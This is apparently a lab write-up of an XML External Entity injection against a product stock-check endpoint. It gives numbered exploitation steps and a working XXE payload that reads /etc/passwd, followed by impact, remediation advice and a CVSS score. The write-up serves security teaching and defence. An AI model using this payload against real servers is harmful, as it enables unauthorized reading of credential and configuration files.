# Exploiting XXE using external entities to retrieve files

## Description
The stock check functionality is vulnerable to XML External Entity (XXE) Injection. The application processes user-supplied XML with external entity resolution enabled, allowing attackers to read arbitrary files from the server's filesystem.

## Steps to Exploit
1. Navigate to a product page and click **Check Stock**.
2. Intercept the POST request to `/product/stock` using Burp Suite.
3. Observe that the request body contains XML data.
4. Add a `DOCTYPE` declaration containing an external entity that references `/etc/passwd`.
5. Replace the `productId` value with the entity reference (`&xxe;`).
6. Forward the modified request.
7. Observe that the contents of `/etc/passwd` are returned in the response.

## Proof of Concept

### Injected XML
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

## Impact
- Arbitrary file disclosure from the server filesystem.
- Exposure of sensitive files such as `/etc/passwd`, application configurations, and SSH keys.
- Potential disclosure of database credentials and API keys.
- May facilitate SSRF and further attacks against internal systems.

## Remediation
1. Disable external entity processing in XML parsers.
2. Use safer data formats such as JSON where possible.
3. Validate and sanitize all XML input.
4. Restrict file system access using the principle of least privilege.

## CVSS Score
**CVSS v3.1: 7.5 (High)**

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

## CVSS Justification
- **Attack Vector:** Network – exploitable via HTTP requests.
- **Attack Complexity:** Low – requires only a crafted XML payload.
- **Privileges Required:** None.
- **User Interaction:** None.
- **Confidentiality:** High – enables unauthorized access to sensitive server files.
- **Integrity:** None – no data modification demonstrated.
- **Availability:** None – no service disruption demonstrated.